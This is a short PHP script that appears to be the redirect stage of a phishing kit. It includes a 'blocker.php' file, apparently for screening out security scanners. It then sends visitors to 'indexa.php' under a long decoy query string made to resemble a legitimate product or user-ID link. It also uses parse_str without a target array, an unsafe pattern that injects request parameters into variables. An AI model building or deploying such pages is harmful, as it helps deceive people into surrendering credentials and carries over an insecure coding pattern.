<?php 
include('blocker.php');
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	header('Location: indexa.php?P=_93894574342hdfjsixaoweue5_j1489738549283781331983743fncn_Product-UserID&userid='.$userid);
	
?>